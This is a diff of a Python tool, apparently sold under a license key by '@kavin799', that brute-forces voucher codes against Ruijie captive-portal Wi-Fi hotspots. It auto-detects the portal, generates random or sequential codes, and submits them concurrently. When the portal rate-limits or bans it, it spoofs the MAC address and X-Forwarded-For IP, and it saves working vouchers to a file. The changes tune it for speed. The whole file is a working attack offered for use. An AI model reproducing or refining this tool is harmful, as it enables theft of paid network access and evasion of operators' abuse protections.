@@ -1,20 +1,16 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (FINAL)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Core Logic Fixed)
 # Part 1 of 2
-# Official Ruijie API + Auto-Detect + Fresh Start per Run
 # =====================================================================
 
 import os
 import time
 import random
 import string
-import re
-import html
 import json
 import asyncio
 import aiohttp
 import urllib3
-import sys
 import socket
 import threading
 import requests
@@ -29,7 +25,6 @@ from rich.layout import Layout
 from rich.table import Table
 from rich.align import Align
 
-# ---------- License ----------
 try:
     import license as _license
     HAS_LICENSE_MODULE = True
@@ -40,37 +35,21 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-
-# ---------- Speed / Safety ----------
 CONCURRENCY_LIMIT = 10
-RATE_LIMIT_SLEEP = 0.2
-NETWORK_RETRY_SLEEP = 0.3
-SESSION_REFRESH_SLEEP = 0.4
+RATE_LIMIT_SLEEP = 0.1  # V15 အတိုင်း ပိုမြန်အောင် လျှော့ထားသည်
 
-# ---------- Ruijie Official API ----------
+# Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
 RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
 RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
 
 console = Console()
-
-# ⭐ တစ် run အတွင်းသာ — run အသစ်မှာ ဗလာပြန်
 tried_codes = set()
 code_lock = threading.Lock()
-
 LICENSE_INFO = {"status": ""}
 
-VENDOR_PREFIXES = [
-    [0x00, 0x1A, 0x2B], [0x00, 0x50, 0x56], [0x00, 0x0C, 0x29],
-    [0x64, 0x66, 0xB3], [0xCC, 0x2D, 0xE0], [0x54, 0x60, 0x09],
-    [0x28, 0xFF, 0x82], [0x70, 0x3A, 0x0E], [0xAC, 0xDE, 0x48],
-    [0x10, 0x4F, 0xA8], [0x38, 0xBC, 0x1A], [0x74, 0xDA, 0xDA],
-    [0x00, 0x16, 0x3E], [0x00, 0x74, 0x9C], [0xE0, 0x3F, 0x49],
-]
-
 def generate_random_mac():
-    prefix = random.choice(VENDOR_PREFIXES)
-    mac = list(prefix) + [random.randint(0x00, 0xff) for _ in range(3)]
+    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
     return ':'.join(map(lambda x: "%02x" % x, mac))
 
 def generate_random_ip():
@@ -83,37 +62,23 @@ def clear_screen():
 def format_time(seconds):
     try:
         seconds = int(seconds)
-        h = seconds // 3600
-        m = (seconds % 3600) // 60
-        s = seconds % 60
-        return f"{h:02d}:{m:02d}:{s:02d}"
+        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
     except Exception: return "00:00:00"
 
-
 # ============================================================
-#  LICENSE
+#  LICENSE & AUTO-DETECT (V15 Logic)
 # ============================================================
-
 def check_license():
     if HAS_LICENSE_MODULE:
-        try:
-            return _license.check_approval()
-        except Exception:
-            pass
+        try: return _license.check_approval()
+        except Exception: pass
     return False, "No license module"
 
 def activate_license(key):
     if HAS_LICENSE_MODULE:
-        try:
-            return _license.activate(key)
-        except Exception as e:
-            return False, f"Error: {e}"
+        try: return _license.activate(key)
+        except Exception as e: return False, f"Error: {e}"
     return False, "No license module"
-
-
-# ============================================================
-#  AUTO-DETECT PORTAL URL
-# ============================================================
 
 def get_gateway_ip():
     try:
@@ -124,8 +89,7 @@ def get_gateway_ip():
         parts = ip.split('.')
         parts[-1] = '1'
         return '.'.join(parts)
-    except:
-        return "192.168.110.1"
+    except: return "192.168.110.1"
 
 def extract_params_from_url(url):
     parsed = urlparse(url)
@@ -145,26 +109,20 @@ def extract_params_from_url(url):
     return params
 
 def auto_detect_portal():
-    console.print(Panel(
-        Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
-        border_style="cyan", box=ROUNDED
-    ))
-
+    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")), border_style="cyan", box=ROUNDED))
     session = requests.Session()
     session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
-
+    
     TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
     try:
         r = session.get(TEST_URL, allow_redirects=True, timeout=5)
         if "ruijienetworks" in r.url:
             console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
             return r.url
-    except Exception:
-        pass
+    except: pass
 
     console.print("[yellow][*][/yellow] Checking Gateways...")
-    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1",
-                "10.44.77.254", "192.168.1.1"]
+    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
     gateways = list(dict.fromkeys(gateways))
 
     for gw in gateways:
@@ -173,16 +131,12 @@ def auto_detect_portal():
             if "ruijienetworks" in res.url:
                 console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                 return res.url
-        except Exception:
-            pass
-
+        except: pass
     return None
 
-
 # ============================================================
-#  OFFICIAL SESSION
+#  SESSION FETCH (V15 အတိုင်း Timeout 10 နှင့် ပြင်ထားသည်)
 # ============================================================
-
 async def fetch_official_session(session, gw_params, mac, ip):
     temp_params = dict(gw_params)
     temp_params['mac'] = mac
@@ -204,15 +158,13 @@ async def fetch_official_session(session, gw_params, mac, ip):
 
     try:
         session.cookie_jar.clear()
-        async with session.get(full_url, headers=headers, timeout=8,
-                               allow_redirects=False, ssl=False) as resp:
+        # V15 ကဲ့သို့ Timeout ကို 10 ပေးထားသည်
+        async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False, ssl=False) as resp:
             location = resp.headers.get('Location', '')
-            if not location:
-                return None
+            if not location: return None
 
             loc_lower = location.lower()
-            if ("request limited" in loc_lower or "error.html" in loc_lower
-                or "errormsg" in loc_lower or "banned" in loc_lower):
+            if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
                 return "BAN"
 
             q = parse_qs(urlparse(location).query)
@@ -223,14 +175,10 @@ async def fetch_official_session(session, gw_params, mac, ip):
                     'sign': q.get('sign', [None])[0],
                     'timestamp': q.get('timestamp', [None])[0],
                 }
-    except asyncio.TimeoutError:
-        return "TIMEOUT"
-    except aiohttp.ClientError:
-        return "NETERR"
-    except Exception:
-        pass
+    except asyncio.TimeoutError: return "TIMEOUT"
+    except aiohttp.ClientError: return "NETERR"
+    except Exception: pass
     return None
-
 
 async def test_code_official(session, sess_data, code, mac, ip):
     url = RUIJIE_VOUCHER
@@ -239,7 +187,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
 
     headers = {
         "content-type": "application/json",
-        "user-agent": f"Mozilla/5.0 (Linux; Android 12) KavinV6-{mac}",
+        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
         "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
         "Client-Mac": mac,
         "X-Forwarded-For": ip,
@@ -250,44 +198,35 @@ async def test_code_official(session, sess_data, code, mac, ip):
         "sessionId": sess_data['sessionId'],
         "apiVersion": 1,
     }
-    if sess_data.get('sign'):      payload["sign"] = sess_data['sign']
+    if sess_data.get('sign'): payload["sign"] = sess_data['sign']
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers,
-                                timeout=6, ssl=False, allow_redirects=True) as r:
-            if r.status == 429:
-                return "__RATE_LIMITED__", "1HR"
+        # V15 ကဲ့သို့ Timeout 10 ပေးထားသည်
+        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False, allow_redirects=True) as r:
+            if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
             text = await r.text()
-            if not text:
-                return "__NETWORK_ERROR__", "1HR"
+            if not text: return "__NETWORK_ERROR__", "1HR"
 
             final_url = str(r.url).lower()
             low = text.lower()
-            if ("request%20limited" in final_url or "request limited" in final_url
-                or "request limited" in low or "too many" in low):
+            if ("request%20limited" in final_url or "request limited" in final_url or "request limited" in low or "too many" in low):
                 return "__RATE_LIMITED__", "1HR"
 
             plan = "1HR"
-            if "2hr" in low or "2 hour" in low:           plan = "2HR"
-            elif "12hr" in low or "12 hour" in low:       plan = "12HR"
+            if "2hr" in low or "2 hour" in low: plan = "2HR"
+            elif "12hr" in low or "12 hour" in low: plan = "12HR"
             elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"
 
             return text, plan
-
-    except asyncio.TimeoutError:
-        return "__TIMEOUT__", "1HR"
-    except aiohttp.ClientError:
-        return "__NETWORK_ERROR__", "1HR"
-    except Exception as e:
-        return f"__ERROR__:{type(e).__name__}", "1HR"
-
+    except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
+    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
+    except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"
 
 # ============================================================
 #  CODE GENERATOR
 # ============================================================
-
 seq_counter = 0
 seq_lock = threading.Lock()
 
@@ -298,52 +237,32 @@ def gen_code(mode, length, scan_method="random"):
             with seq_lock:
                 seq_counter += 1
                 current = seq_counter
-
-            if mode == "num":
-                return str(current).zfill(length)
+            if mode == "num": return str(current).zfill(length)
             elif mode == "eng":
                 s, n = "", current
-                for _ in range(length):
-                    s = chr(ord('a') + (n % 26)) + s
-                    n //= 26
+                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
                 return s
             elif mode == "mix":
                 chars = string.ascii_lowercase + string.digits
                 s, n = "", current
-                for _ in range(length):
-                    s = chars[n % 36] + s
-                    n //= 36
+                for _ in range(length): s = chars[n % 36] + s; n //= 36
                 return s
         else:
-            if mode == "num":
-                return str(random.randint(0, 10**length - 1)).zfill(length)
-            elif mode == "eng":
-                return ''.join(random.choices(string.ascii_lowercase, k=length))
-            elif mode == "mix":
-                return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-    except Exception:
-        pass
+            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
+            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
+            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (FINAL)
+# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Core Logic Fixed)
 # Part 2 of 2
 # =====================================================================
 
-# ============================================================
-#  DASHBOARD
-# ============================================================
-
-def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed,
-                             status, hits, speed, cur_mac, cur_ip, tried_count):
+def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count):
     layout = Layout()
     header_text = Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_cyan", justify="center")
-    sub_text = Text(f"Official Ruijie API • {scan_method.upper()} • @kavin799",
-                    style="bold bright_green", justify="center")
-    layout.split_column(
-        Layout(Panel(Align.center(Text.assemble(header_text, "\n", sub_text)),
-                     border_style="cyan", box=ROUNDED), size=4),
-        Layout(name="body", ratio=1)
-    )
+    sub_text = Text(f"Official Ruijie API • {scan_method.upper()} • @kavin799", style="bold bright_green", justify="center")
+    layout.split_column(Layout(Panel(Align.center(Text.assemble(header_text, "\n", sub_text)), border_style="cyan", box=ROUNDED), size=4), Layout(name="body", ratio=1))
 
     stats = Table.grid(expand=True, padding=(0, 1))
     stats.add_column(style="bold white", justify="left")
@@ -359,49 +278,28 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed,
     stats.add_row("  💾 This Run", f": {tried_count:,}",         "  ",          "")
 
     stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
-    check_panel = Panel(
-        Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}",
-                          style="bold yellow")),
-        border_style="yellow", box=ROUNDED, height=3
-    )
+    check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)
 
-    v_table = Table(show_header=True, header_style="bold bright_white",
-                    expand=True, box=ROUNDED, border_style="green")
+    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
     v_table.add_column("Voucher Hits", style="bold green", justify="center")
     v_table.add_column("Plan", style="bold green", justify="center")
     v_table.add_column("Remaining", style="bold green", justify="center")
 
     for h in hits[-10:]:
-        code_str = h.get('code', '') if isinstance(h, dict) else h
-        plan_str = h.get('plan', '1HR') if isinstance(h, dict) else '1HR'
-        v_table.add_row(code_str, plan_str, "Active")
+        v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits:
-        v_table.add_row("[dim]KAVIN FAST SPEED V6 • Fresh Start per Run[/dim]", "", "")
+    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Fresh Start per Run[/dim]", "", "")
 
-    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨",
-                                 "bold bright_yellow"))
+    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
 
     body_layout = Layout()
-    body_layout.split_column(
-        Layout(stats_panel, size=8),
-        Layout(check_panel, size=3),
-        Layout(v_table, ratio=1),
-        Layout(footer_panel, size=3)
-    )
+    body_layout.split_column(Layout(stats_panel, size=8), Layout(check_panel, size=3), Layout(v_table, ratio=1), Layout(footer_panel, size=3))
     layout["body"].update(body_layout)
     return layout
 
-
-# ============================================================
-#  SCAN LOOP
-# ============================================================
-
 async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     global seq_counter, tried_codes
-
-    # ⭐ အမြဲ ဗလာ — run အသစ်မှာ အစကနေ
     tried_codes = set()
     seq_counter = 0
 
@@ -417,9 +315,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
         }
 
     mode_str = f"{mode}_{length}"
-    hits = []
-    tested = 0
-    start_time = time.time()
+    hits, tested, start_time = [], 0, time.time()
     current_code = [""]
     current_status = ["Init"]
 
@@ -429,33 +325,20 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
-
-        live = Live(
-            get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00",
-                                     "Init", hits, 0.0, current_mac, current_ip, 0),
-            refresh_per_second=4, screen=False
-        )
+        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac, current_ip, 0), refresh_per_second=4, screen=False)
 
         with live:
             try:
                 while True:
                     if sess_data[0] is None:
                         current_status[0] = "Session"
-                        res = await fetch_official_session(
-                            session, gw_params, current_mac, current_ip
-                        )
+                        res = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
                             current_status[0] = "Banned → Spoof"
                             current_mac = generate_random_mac()
                             current_ip  = generate_random_ip()
-                            live.update(get_dashboard_renderable(
-                                mode_str, scan_method, current_code[0], tested,
-                                format_time(time.time() - start_time),
-                                current_status[0], hits,
-                                (tested / max(1, time.time() - start_time) * 60),
-                                current_mac, current_ip, len(tried_codes)
-                            ))
+                            live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / max(1, time.time() - start_time) * 60), current_mac, current_ip, len(tried_codes)))
                             await asyncio.sleep(RATE_LIMIT_SLEEP)
                             continue
 
@@ -463,7 +346,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             current_status[0] = "Retry"
                             current_mac = generate_random_mac()
                             current_ip  = generate_random_ip()
-                            await asyncio.sleep(SESSION_REFRESH_SLEEP)
+                            await asyncio.sleep(0.5) # V15 အတိုင်း ခဏစောင့်
                             continue
 
                         sess_data[0] = res
@@ -474,18 +357,13 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         c = gen_code(mode, length, scan_method)
                         if c:
                             with code_lock:
-                                if c in tried_codes:   # ← ဒီ run အတွင်း ထပ်မစစ်
-                                    continue
+                                if c in tried_codes: continue
                                 tried_codes.add(c)
                             batch_codes.append(c)
                     if not batch_codes:
                         await asyncio.sleep(0.05); continue
 
-                    tasks = [
-                        test_code_official(
-                            session, sess_data[0], code, current_mac, current_ip
-                        ) for code in batch_codes
-                    ]
+                    tasks = [test_code_official(session, sess_data[0], code, current_mac, current_ip) for code in batch_codes]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
 
                     hit_found_in_batch = False
@@ -494,9 +372,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         code = batch_codes[idx]
                         current_code[0] = code
 
-                        if isinstance(res_tuple, Exception):
-                            continue
-
+                        if isinstance(res_tuple, Exception): continue
                         res, plan = res_tuple
 
                         if res == "__RATE_LIMITED__":
@@ -507,12 +383,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             hit_found_in_batch = True
                             break
 
-                        if res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
+                        if res in ("__TIMEOUT__", "__NETWORK_ERROR__") or res.startswith("__ERROR__:"):
                             current_status[0] = "NetErr"
-                            continue
-
-                        if res.startswith("__ERROR__:"):
-                            current_status[0] = "Err"
                             continue
 
                         low = res.lower()
@@ -528,13 +400,9 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         try:
                             j = json.loads(res)
                             if j.get("success") is True and isinstance(j.get("result"), dict):
-                                if j["result"].get("logonUrl"):
-                                    is_hit = True
+                                if j["result"].get("logonUrl"): is_hit = True
                         except Exception:
-                            if ('"success":true' in low
-                                or '"authresult":"1"' in low
-                                or "congratulations" in low):
-                                is_hit = True
+                            if ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low): is_hit = True
 
                         if is_hit:
                             now_str = time.strftime("%H:%M:%S")
@@ -543,7 +411,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                                 with open(HITS_FILE, "a", encoding="utf-8") as f:
                                     f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                             except Exception: pass
-                            # ⭐ tried_codes ကို ဖိုင်ထဲ မသိမ်း — run အတွင်းသာ
+                            
                             current_status[0] = "HIT!"
                             sess_data[0] = None
                             current_mac = generate_random_mac()
@@ -555,14 +423,9 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
-                    live.update(get_dashboard_renderable(
-                        mode_str, scan_method, current_code[0], tested,
-                        format_time(elapsed), current_status[0], hits, speed,
-                        current_mac, current_ip, len(tried_codes)
-                    ))
+                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac, current_ip, len(tried_codes)))
 
-                    if hit_found_in_batch:
-                        await asyncio.sleep(0.15)
+                    if hit_found_in_batch: await asyncio.sleep(0.15)
 
             except (KeyboardInterrupt, asyncio.CancelledError):
                 live.stop()
@@ -571,17 +434,15 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 live.stop()
                 console.print(f"\n[bold red]Error: {e}[/bold red]")
 
-
 # ============================================================
 #  UI / MENU
 # ============================================================
-
 def show_banner():
     clear_screen()
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • Fresh Start per Run", style="bold bright_yellow"), justify="center")
+    console.print(Text("Official Ruijie API • Auto-Detect", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
@@ -614,8 +475,8 @@ def ask_length(mode):
 def ask_scan_method():
     while True:
         show_banner()
-        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode (ကျပန်းစနစ်)")
-        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode (အစဉ်လိုက်စနစ်)")
+        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
+        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
         console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
         choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
         if choice == "0": return None
@@ -630,8 +491,7 @@ def run():
     if portal_url:
         extracted = extract_params_from_url(portal_url)
         console.print(f"[bold green][+][/bold green] URL fetched successfully!")
-        console.print(f"[dim]    gw_id={extracted.get('gw_id','?')} | gw_sn={extracted.get('gw_sn','?')}[/dim]")
-        time.sleep(1.5)
+        time.sleep(1)
 
         gw_params = {
             "stage": "portal",
@@ -647,12 +507,10 @@ def run():
             "ustate": "0", "mac_req": "1",
             "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
             "chap_id": extracted.get("chap_id", r"\245"),
-            "chap_challenge": extracted.get("chap_challenge",
-                r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
+            "chap_challenge": extracted.get("chap_challenge", r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
         }
     else:
-        console.print("[bold red][-][/bold red] Auto-detect failed.")
-        console.print("[yellow][*][/yellow] Using default gateway params.")
+        console.print("[bold red][-][/bold red] Auto-detect failed. Using default gateway params.")
         time.sleep(1.5)
 
     while True:
@@ -664,38 +522,28 @@ def run():
         if scan_method is None: continue
 
         try:
-            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method,
-                                        gw_params=gw_params))
-        except KeyboardInterrupt:
-            pass
+            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
+        except KeyboardInterrupt: pass
         break
 
 def main():
     global LICENSE_INFO
     try:
         is_valid, expiry_msg = check_license()
-
         while not is_valid:
             clear_screen()
-            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V6 ⚡",
-                                                  style="bold bright_magenta")),
-                                border_style="bright_magenta"))
-            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐",
-                                                  style="bold yellow")),
-                                border_style="yellow"))
+            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
+            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐", style="bold yellow")), border_style="yellow"))
             key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
             if key:
                 ok, msg = activate_license(key)
-                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")),
-                                    border_style="green" if ok else "red"))
+                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
                 time.sleep(2)
                 is_valid, expiry_msg = check_license()
-            else:
-                time.sleep(1)
+            else: time.sleep(1)
 
         LICENSE_INFO["status"] = expiry_msg
         run()
-
     except (KeyboardInterrupt, EOFError):
         console.print("\n\n[bold red]Exiting Kavin Scanner V6...[/bold red]\n")
     except Exception as e:
@@ -705,8 +553,7 @@ def main():
         except Exception: pass
         try:
             console.print("\n\n")
-            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏",
-                               style="bold bright_green"), justify="center")
+            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏", style="bold bright_green"), justify="center")
             console.print("\n\n")
             time.sleep(1)
         except Exception: pass
